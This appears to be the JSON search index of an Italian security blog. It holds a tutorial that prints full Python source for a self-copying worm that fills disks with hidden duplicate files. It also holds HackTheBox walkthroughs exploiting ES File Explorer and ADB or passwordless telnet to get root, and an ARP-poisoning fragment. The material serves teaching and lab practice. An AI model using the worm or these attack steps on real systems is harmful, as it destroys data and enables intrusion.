l\u0026rsquo;indirizzo IP di un\u0026rsquo;altra stazione al proprio indirizzo MAC.\nDAI si basa sullo snooping DHCP. Lo snooping DHCP ascolta gli scambi di messaggi DHCP e crea un database di associazioni di tuple valide (indirizzo MAC, indirizzo IP, interfaccia VLAN).\nQuando DAI √® abilitato, lo switch elimina il pacchetto ARP se l\u0026rsquo;indirizzo MAC e l\u0026rsquo;indirizzo IP del mittente non corrispondono a una voce nel database dei binding di snooping DHCP. Tuttavia, pu√≤ essere superato attraverso mappature statiche. I mapping statici sono utili quando gli host configurano indirizzi IP statici, lo snooping DHCP non pu√≤ essere eseguito o altri switch nella rete non eseguono l\u0026rsquo;ispezione ARP dinamica. Una mappatura statica associa un indirizzo IP a un indirizzo MAC su una VLAN.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/","tags":["Protocollo ARP","ARP Poisoning","Python","Scapy","DAI"],"title":"Introduzione All'ARP Poisoning"},{"categories":["Tutorial","Malware Analysis"],"contents":"Table Of Contents:\n Cos\u0026rsquo;√® un Worm Scrivere un worm in Python  In questo post voglio iniziare una mini serie sulla Malware Analysis, al fine di comprendere qual\u0026rsquo;√® il funzionamento di un virus, quali danni pu√≤ comportare su un sistema e come scriverlo. La presa di consapevolezza di una certa minaccia, √® la prima contromisura per potersi difendere da essa. Molti utente non sanno bene cos\u0026rsquo;√® un Virus o qualsiasi altra sua variante, dunque questa serie prova a fare chiarezza sul tema mediante le ricerche che ho fatto in rete in merito.\nCos\u0026rsquo;√® un Worm Un worm √® un programma software dannoso che si replica sfruttando in modo indipendente le vulnerabilit√† nelle reti. A differenza di un virus, che richiede l\u0026rsquo;esecuzione di un programma host, i worm possono essere eseguiti da soli. A parte l\u0026rsquo;infezione iniziale dell\u0026rsquo;host, non richiedono la partecipazione dell\u0026rsquo;utente e possono diffondersi molto rapidamente sulla rete, di solito rallentandola.\nI worm condividono schemi simili: sfruttano le vulnerabilit√† del sistema, hanno un modo per propagarsi e contengono tutti codice dannoso (payload) per causare danni ai sistemi o alle reti dei computer. I worm sono responsabili di alcuni degli attacchi pi√π devastanti su Internet. Nel 2001, il worm Code Red aveva infettato oltre 300.000 server in sole 19 ore.\nAlcune persone pensano che un worm informatico e un virus informatico siano la stessa cosa perch√© i due si comportano in modo simile. Potrebbero persino usare termini come \u0026ldquo;worm computer virus\u0026rdquo; o \u0026ldquo;worm virus malware\u0026rdquo;. La verit√† √® che i due sono minacce comparabili ma diverse.\nLa differenza fondamentale tra un virus e un worm √® che i virus si basano sull\u0026rsquo;azione umana per l\u0026rsquo;attivazione e hanno bisogno di un sistema host per replicarsi. In altre parole, un virus non dannegger√† il tuo sistema a meno che tu non lo esegua. Ad esempio, un virus su un\u0026rsquo;unit√† flash collegata al tuo computer non dannegger√† il tuo sistema a meno che tu non lo attivi. E come accennato in precedenza, un worm non ha bisogno di un sistema host o di un\u0026rsquo;azione dell\u0026rsquo;utente per diffondersi.\nNel corso degli anni, ci sono stati alcuni vermi particolarmente devastanti. Alcuni vermi hanno causato miliardi di danni. Ecco un breve elenco di alcuni famigerati:\n Morris Worm: noto anche come Internet worm, questo √® stato uno dei primi worm informatici a diffondersi tramite Internet e guadagnare notoriet√† nei media. Bagle: noto anche come Beagle, Mitglieder e Lodeight, questo worm di mailing di massa aveva molte varianti. Blaster: noto anche come MSBlast, Lovesan e Lovsan, questo worm ha attaccato i computer con Windows XP e Windows 2000. Conficker: noto anche come Downup, Downadup e Kido, questo worm ha sfruttato i difetti di Windows per infettare milioni di computer in oltre cento paesi. ILOVEYOU: Il worm ILOVEYOU ha infettato decine di milioni di computer in tutto il mondo, causando danni per miliardi di dollari. Mydoom: questo √® diventato il worm di posta elettronica a pi√π rapida diffusione nel 2004, inviando posta indesiderata attraverso i computer. Ryuk: Sebbene Ryuk non sia sempre stato un worm, ora √® un ransomware simile a un worm. SQL Slammer: il worm SQL Slammer ha guadagnato fama per aver rallentato il traffico Internet con attacchi denial-of-service su alcuni host Internet. Storm Worm: questo worm ha utilizzato l\u0026rsquo;ingegneria sociale con notizie false di una tempesta disastrosa per lanciare botnet su macchine compromesse. Stuxnet: alcuni esperti ritengono che questo sofisticato worm sia stato sviluppato per anni per lanciare un attacco informatico.  Molti dei sintomi di un worm informatico sono simili a quelli di un virus informatico. Ad esempio, potresti avere un worm se il tuo computer rallenta, si blocca, si blocca o genera messaggi di errore. Potresti anche notare che i file sono mancanti o danneggiati o che lo spazio sul tuo disco rigido si sta rapidamente esaurendo inspiegabilmente. Inoltre, potresti ricevere avvisi dal tuo firewall su una violazione.\nCome altre forme di malware, i worm informatici possono essere fermati con il giusto software antivirus e antimalware e pratiche informatiche sicure. Si prega di non intrattenere collegamenti sospetti, e-mail, testi, messaggi, siti Web, reti di file P2P e unit√†. Inoltre, aggiorna regolarmente il tuo software essenziale per proteggere il tuo computer da vulnerabilit√† come il difetto di Windows wormable e simili.\nScrivere un worm in Python Il worm √® un tipo di malware che replica se stesso e altri file per consumare spazio nei nostri dischi rigidi. Potresti scoprire che le tue unit√† o partizioni si riempiono senza alcun motivo visibile e ci√≤ potrebbe accadere a causa di un worm.\nUn worm √® diverso da un virus informatico in quanto i virus tipici infettano solo i file e i worm replicano i file e tengono i duplicati fuori dalla vista (come file nascosti).\nAvremo bisogno di due moduli per scrivere un worm. Qui, os √® il modulo pi√π importante e lo utilizzeremo per elencare tutti i file e le directory oltre a recuperare i percorsi assoluti.\nshutil √® usato per copiare il contenuto del file. Ci sono ovviamente altri modi per farlo, tuttavia, ho scelto di farlo usando il metodo shutil.copyfile().\nimport os import shutil Innanzitutto, creiamo una classe Worm e un metodo di inizializzazione per passare gli argomenti iniziali alla nostra classe creata.\nclass Worm: def __init__(self, path=None, target_dir_list=None, iteration=None): if isinstance(path, type(None)): self.path = \u0026#34;/\u0026#34; else: self.path = path if isinstance(target_dir_list, type(None)): self.target_dir_list = [] else: self.target_dir_list = target_dir_list if isinstance(target_dir_list, type(None)): self.iteration = 2 else: self.iteration = iteration # get own absolute path self.own_path = os.path.realpath(__file__) Qui abbiamo tre argomenti:\n path: definisce dove iniziare a cercare le directory (l\u0026rsquo;impostazione predefinita √® la directory principale /) target_dir_list: l\u0026rsquo;utente pu√≤ passare un elenco di directory di destinazione iniziali. Per impostazione predefinita √® un elenco vuoto [] iteration: Ho usato questo parametro per definire quante istanze creer√† il worm per ogni file esistente in una directory (il valore predefinito √® 2 solo a scopo di test, puoi aumentare o diminuire il numero, o meglio fornire valur durante la creazione di un oggetto della classe)  Il primo metodo di cui abbiamo bisogno √® elencare tutte le directory e le sottodirectory di destinazione in cui vogliamo copiare il nostro worm ei file esistenti nelle directory.\nQui, sto evitando i file nascosti poich√© include anche le directory principali (i file nascosti iniziano con il punto . in Linux o macOS). A parte questo, aggiunge un file (le directory sono anche chiamate file nei file system basati su Unix) se si tratta di una directory e lo fa in modo ricorsivo per tutte le sottodirectory.\ndef list_directories(self,path): self.target_dir_list.append(path) files_in_current_directory = os.listdir(path) for file in files_in_current_directory: # avoid hidden files/directories (start with dot (.)) if not file.startswith(\u0026#39;.\u0026#39;): # get the full path absolute_path = os.path.join(path, file) print(absolute_path) if os.path.isdir(absolute_path): self.list_directories(absolute_path) else: pass Per replicare lo script stesso in tutte le directory di destinazione, otteniamo il percorso assoluto dello script che stiamo eseguendo, quindi copiamo il contenuto nelle directory di destinazione creando un nuovo file nascosto (inizia con un punto .) con lo stesso nome.\ndef create_new_worm(self): for directory in self.target_dir_list: destination = os.path.join(directory, \u0026#34;.worm.py\u0026#34;) # copy the script in the new directory with similar name shutil.copyfile(self.own_path, destination) Il seguente metodo verr√† utilizzato per duplicare i file il numero di volte il valore che abbiamo dall\u0026rsquo;argomento di iterazione. Puoi inserire un numero elevato in modo che il disco rigido si riempia presto.\ndef copy_existing_files(self): for directory in self.target_dir_list: file_list_in_dir = os.listdir(directory) for file in file_list_in_dir: abs_path = os.path.join(directory, file) if not abs_path.startswith(\u0026#39;.\u0026#39;) and not os.path.isdir(abs_path): source = abs_path for i in range(self.iteration): destination = os.path.join(directory,(\u0026#34;.\u0026#34;+file+str(i))) shutil.copyfile(source, destination) In questo metodo, chiameremo tutti i nostri metodi precedenti. Quindi, quando chiamiamo questo metodo utilizzando il nostro oggetto creato, il worm avvier√† tutte le azioni in sequenza.\ndef start_worm_actions(self): self.list_directories(self.path) print(self.target_dir_list) self.create_new_worm() self.copy_existing_files() Ora, creiamo la nostra funzione principale ed eseguiamo il codice:\nif __name__==\u0026#34;__main__\u0026#34;: current_directory = os.path.abspath(\u0026#34;\u0026#34;) worm = Worm(path=current_directory) worm.start_worm_actions() Qui, per evitare di riempire il nostro disco, usiamo la directory esistente solo usando os.path.abspath(\u0026quot;\u0026quot;), e passiamolo come argomento durante la creazione di un oggetto della classe Worm. Finalmente chiamiamo il metodo di integrazione e siamo a posto.\nEcco il codice completo:\nimport os import shutil class Worm: def __init__(self, path=None, target_dir_list=None, iteration=None): if isinstance(path, type(None)): self.path = \u0026#34;/\u0026#34; else: self.path = path if isinstance(target_dir_list, type(None)): self.target_dir_list = [] else: self.target_dir_list = target_dir_list if isinstance(target_dir_list, type(None)): self.iteration = 2 else: self.iteration = iteration # get own absolute path self.own_path = os.path.realpath(__file__) def list_directories(self,path): self.target_dir_list.append(path) files_in_current_directory = os.listdir(path) for file in files_in_current_directory: # avoid hidden files/directories (start with dot (.)) if not file.startswith(\u0026#39;.\u0026#39;): # get the full path absolute_path = os.path.join(path, file) print(absolute_path) if os.path.isdir(absolute_path): self.list_directories(absolute_path) else: pass def create_new_worm(self): for directory in self.target_dir_list: destination = os.path.join(directory, \u0026#34;.worm.py\u0026#34;) # copy the script in the new directory with similar name shutil.copyfile(self.own_path, destination) def copy_existing_files(self): for directory in self.target_dir_list: file_list_in_dir = os.listdir(directory) for file in file_list_in_dir: abs_path = os.path.join(directory, file) if not abs_path.startswith(\u0026#39;.\u0026#39;) and not os.path.isdir(abs_path): source = abs_path for i in range(self.iteration): destination = os.path.join(directory,(\u0026#34;.\u0026#34;+file+str(i))) shutil.copyfile(source, destination) def start_worm_actions(self): self.list_directories(self.path) print(self.target_dir_list) self.create_new_worm() self.copy_existing_files() if __name__==\u0026#34;__main__\u0026#34;: current_directory = os.path.abspath(\u0026#34;\u0026#34;) worm = Worm(path=current_directory) worm.start_worm_actions() Vediamo un esempio pratico, abbiamo creato questa struttura di file di testo e sottocartelle di prova:\nEseguiamo il worm 2 volte con il comando:\npython3 worm.py Ecco il risultato:\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/scrivere-un-worm-in-python/scrivere_un_worm_in_python/","tags":["Malware Analysis","Malware","Worm","Python"],"title":"Scrivere un Worm in Python"},{"categories":["Walkthrough HackTheBox"],"contents":"Table of Contents:\n Enumerazione con Nmap Analisi delle porte  Sfruttamento dell‚ÄôExploit con Metasploit Sfruttamento dell‚ÄôExploit con CVE (Script Python)   Privilage Escalation   Explore √® una macchina Android di facile difficolt√†. L‚Äôenumerazione della rete rivela un servizio vulnerabile, sfruttabile tramite un modulo Metasploit e fornisce un accesso in lettura limitato alla macchina. Un‚Äôulteriore enumerazione dei file, rivela le credenziali SSH di un utente del sistema, consentendo cos√¨ l‚Äôaccesso remoto alla macchina. Infine, l‚Äôaggressore √® in grado di inoltrare localmente una porta filtrata utilizzando il tunneling SSH, al fine di accedere alla shell di Android tramite l‚ÄôAndroid Debug Bridge (ADB). Questa eventualit√† consente all‚Äôutente malintenzionato di eseguire comandi come utente root.\nEnumerazione con Nmap Eseguiamo l‚Äôenumerazione dei servizi con Nmap, facciamo una prima scansione con il seguente comando:\n1. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.247 | grep ^[0-9] | cut -d \u0026#39;/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s/,$//) 2. nmap -p$ports -sC -sV [address] L‚Äôoutput sar√†:\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-29 09:58 EST Nmap scan report for explore (10.10.10.247) Host is up (0.039s latency). PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 7190e3a7c95d836634883debb4c788fb (RSA) 5555/tcp filtered freeciv 34245/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:13 GMT | Content-Length: 22 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | GetRequest: | HTTP/1.1 412 Precondition Failed | Date: Tue, 29 Nov 2022 14:59:13 GMT | Content-Length: 0 | HTTPOptions: | HTTP/1.0 501 Not Implemented | Date: Tue, 29 Nov 2022 14:59:18 GMT | Content-Length: 29 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Method not supported: OPTIONS | Help: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 26 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: HELP | RTSPRequest: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:18 GMT | Content-Length: 39 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | valid protocol version: RTSP/1.0 | SSLSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 73 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ?G???,???`~? | ??{????w????\u0026lt;=?o? | TLSSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 71 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ??random1random2random3random4 | TerminalServerCookie: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 54 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: |_ Cookie: mstshash=nmap 42135/tcp open http ES File Explorer Name Response httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn\u0026#39;t have a title (text/plain). 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port2222-TCP:V=7.93%I=7%D=11/29%Time=63861E0F%P=x86_64-pc-linux-gnu%r(N SF:ULL,24,\u0026#34;SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port34245-TCP:V=7.93%I=7%D=11/29%Time=63861E0E%P=x86_64-pc-linux-gnu%r( SF:GenericLines,AA,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2 SF:029\\x20Nov\\x202022\\x2014:59:13\\x20GMT\\r\\nContent-Length:\\x2022\\r\\nConte SF:nt-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n SF:\\r\\nInvalid\\x20request\\x20line:\\x20\u0026#34;)%r(GetRequest,5C,\u0026#34;HTTP/1\\.1\\x20412 SF:\\x20Precondition\\x20Failed\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014: SF:59:13\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(HTTPOptions,B5,\u0026#34;HTTP/1 SF:\\.0\\x20501\\x20Not\\x20Implemented\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\ SF:x2014:59:18\\x20GMT\\r\\nContent-Length:\\x2029\\r\\nContent-Type:\\x20text/pl SF:ain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nMethod\\x20not\\x SF:20supported:\\x20OPTIONS\u0026#34;)%r(RTSPRequest,BB,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20 SF:Request\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:18\\x20GMT\\r\\nCon SF:tent-Length:\\x2039\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\ SF:r\\nConnection:\\x20Close\\r\\n\\r\\nNot\\x20a\\x20valid\\x20protocol\\x20version SF::\\x20\\x20RTSP/1\\.0\u0026#34;)%r(Help,AE,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nD SF:ate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length: SF:\\x2026\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnectio SF:n:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20HELP\u0026#34;)%r(SSLSessionRe SF:q,DD,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\ SF:x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length:\\x2073\\r\\nContent-Type:\\x2 SF:0text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid SF:\\x20request\\x20line:\\x20\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\?\\?\\?,\\?\\?\\?`~\\ SF:?\\0\\?\\?{\\?\\?\\?\\?w\\?\\?\\?\\?\u0026lt;=\\?o\\?\\x10n\\0\\0\\(\\0\\x16\\0\\x13\\0\u0026#34;)%r(TerminalS SF:erverCookie,CA,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x20 SF:29\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length:\\x2054\\r\\nConten SF:t-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\ SF:r\\nInvalid\\x20request\\x20line:\\x20\\x03\\0\\0\\*%\\?\\0\\0\\0\\0\\0Cookie:\\x20mst SF:shash=nmap\u0026#34;)%r(TLSSessionReq,DB,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\n SF:Date:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length SF::\\x2071\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnecti SF:on:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20\\x16\\x03\\0\\0i\\x01\\0\\ SF:0e\\x03\\x03U\\x1c\\?\\?random1random2random3random4\\0\\0\\x0c\\0/\\0\u0026#34;); Service Info: Device: phone Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 101.61 seconds Analisi delle porte Nmap rivela un server SSH in esecuzione sulla porta 2222, un servizio HTTP in esecuzione sulla porta 59777 (nel mio caso √© 42135) e un servizio TCP filtrato in esecuzione sulla porta 5555. Cercando online la porta 5555, si ottiene il seguente:\nQuesto sito web mostra le assegnazioni delle porte e le vulnerabilit√† note.\nNello snippet di cui sopra possiamo vedere che la porta 5555 √® utilizzata da Android Debug Bridge (ADB). Android Debug Bridge (adb) √® uno strumento a riga di comando che consente agli utenti di comunicare con un dispositivo Android. Dato che la porta 5555 √® filtrata e non √® possibile connettersi tramite adb, cerchiamo online la porta 59777 che rivela il seguente risultato:\nQuesta porta √® utilizzata dall‚Äôapplicazione ES File Explorer File Manager per Android, secondo questo sito web. Questo sito web indica anche una vulnerabilit√† nota per questa applicazione, in cui un utente malintenzionato √® in grado di eseguire comandi arbitrari sull‚Äôhost. Di seguito vedremo due metodologie per raccogliere le credenziali ssh.\nSfruttamento dell‚ÄôExploit con Metasploit La ricerca nel framework metasploit rivela un modulo per questa vulnerabilit√†:\n1. msfconsole 2. search es file explorer  Il modulo di interesse √®:\n# Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/es_file_explorer_open_port 2019-01-16 normal No ES File Explorer Open Port Utilizziamo questo modulo ed elenchiamo le sue opzioni:\n1. use auxiliary/scanner/http/es_file_explorer_open_port 2. options  Successivamente, si imposta il parametro RHOSTS con l‚ÄôIP dell‚Äôhost e si digita exploit:\n1. set RHOSTS 10.10.10.247 2. exploit  Il risultato √® positivo. L‚Äôazione del parametro √® stata impostata, per impostazione predefinita su GETDEVICEINFO e quindi l‚Äôuscita mostra informazioni sul dispositivo. Elenchiamo tutte le azioni di questo modulo.\nshow actions  Impostando l‚Äôazione su LISTPICS, si ottengono i seguenti risultati.\n1. set action LISTPICS 2. exploit  Questa istruzione sembra elencare tutte le immagini memorizzate nella directory DCIM del telefono. Impostiamo l‚Äôazione su GETFILE e scarichiamo il file creds.jpg:\n1. set action GETFILE 2. set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg 3. exploit  Successivamente, possiamo aprire l‚Äôimmagine utilizzando il visualizzatore di immagini feh:\n1. sudo apt install feh 2. feh ~/.msf4/loot/20211025151836_default_10.10.10.247_getFile_410464.jpg Sfruttamento dell‚ÄôExploit con CVE (Script Python) Effettuando delle ricerce sul ES File Explorer 4.1.9.7.4 troviamo la seguente pagina di Exploit Databse:\nSalviamo il codice di questo exploit. ES File Explorer crea un servizio HTTP associato alla porta 59777 in fase di esecuzione, che fornisce oltre 10 comandi per l‚Äôaccesso ai dati nel telefono cellulare dell‚Äôutente e l‚Äôesecuzione dell‚Äôapplicazione; tuttavia, il servizio non controlla questa richiesta. Eseguendo l‚Äôexploit usando python3 otteniamo un elenco di comandi disponibili che possiamo effettivamente eseguire usando quell‚Äôexploit:\npython3 [script].py --cmd GetDeviceInfo --ip [address]  Innanzitutto, possiamo provare a cercare le credenziali memorizzate in Pics o in Files:\npython3 [script].py listPics [address]  Possiamo accedere ai file utilizzando il nostro browser o scaricandoli singolarmente. C‚Äô√® un file chiamato creds.jpg che possiamo scaricare usando il comando come segue:\npython3 [script].py getFile [address] /storage/emulated/0/DCIM/creds.jpg  Entrambe le strade viste portano al medesimo risultato, ossia avere questo file con le credenziali ssh:\nQuesto sembra un notebook con la password Kr1sT!5h@Rp3xPl0r3! per l‚Äôutente kristi. Utilizziamo queste credenziali e proviamo ad accedere tramite SSH alla porta 2222 che abbiamo trovato in precedenza.\nssh kristi@10.10.10.247 -p 2222  La flag user.txt si trova in /storage/emulated/0/user.txt:\nPrivilage Escalation Avendo accesso all‚Äôhost remoto tramite SSH, si pu√≤ eseguire il seguente comando per assicurarsi che la porta porta filtrata 5555, trovata in precedenza, sia in esecuzione:\nss -ntpl Poich√© la porta 5555 √® filtrata e non possiamo raggiungerla da remoto tramite adb, proviamo a inoltrarla tramite SSH e riprovare di nuovo. Per inoltrare la porta a livello locale, digitate il seguente comando, utilizzando la password Kr1sT!5h@Rp3xPl0r3! ancora una volta:\nssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222 Lo strumento Android Debug Bridge (ADB) sembra essere disponibile sul gestore di pacchetti apt. Installiamolo eseguendo eseguendo il seguente comando:\n1. sudo apt install adb 2. adb --help Nella sezione rete vediamo che utilizzando l‚Äôistruzione connect possiamo collegarci al dispositivo Android. Eseguiamo nuovamente adb dalla nostra macchina locale utilizzando il nostro IP locale:\nadb connect 127.0.0.1:5555  √à possibile elencare i dispositivi collegati eseguendo il seguente comando:\nadb devices  Quindi, si pu√≤ digitare quanto segue per ottenere la shell sulla macchina remota:\nadb -s 127.0.0.1 shell Digitiamo ‚Äúsu‚Äù per diventare utenti root:\nNella directory data vi sar√° la nostra flag:\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/walkthrough-explore/walkthrough_explore_ctf/","tags":["CTF","HackTheBox","Walkthrough","Android","Metasploit","CVE"],"title":"Walkthrough Explore"},{"categories":["Walkthrough HackTheBox"],"contents":"Table Of Contents:\n Enumerazione con Nmap Connessione a Telnet   Enumerazione con Nmap La primissima cosa √® stata eseguire una scansione nmap per vedere quali porte sono aperte, e anche i servizi in esecuzione su ciascuna porta aperta. Ho etichettato specificamente tre porte.\nIl comando √©:\nnmap -sVC -n -A -Pn -p 22, 23, 80 [address] --min-rate 5000 L\u0026rsquo;output:\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-11-24 22:45 CET Nmap scan report for 10.129.46.55 Host is up (0.046s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 23/tcp open telnet Linux telnetd Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.50 seconds Connessione a Telnet Troviamo la porta 23 aperta e sta eseguendo un servizio telnet, proviamo a connetterci alla porta telnet 23.\nUsa il comando:\nsudo apt-get install telnet se non lo hai installato o stai usando una VM, poi lanciamo:\ntelnet [address] L\u0026rsquo;output sar√†:\nCi viene presentata una schermata di accesso. Tenendo presente il suggerimento fornito nell‚Äôattivit√† precedente. Un utente root √® in grado di accedere al servizio telnet senza password. Abbiamo provato a utilizzare il root e abbiamo ottenuto l‚Äôaccesso.\nConfermiamo nel terminale se siamo l‚Äôutente root.\nSe elenchiamo i file nella directory di lavoro corrente, vediamo che flag.txt √® elencato.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/walkthrough-meow/walkthrough_meow_ctf/","tags":["CTF","HackTheBox","Walkthrough","Telnet"],"title":"Walkthrough Meow"}]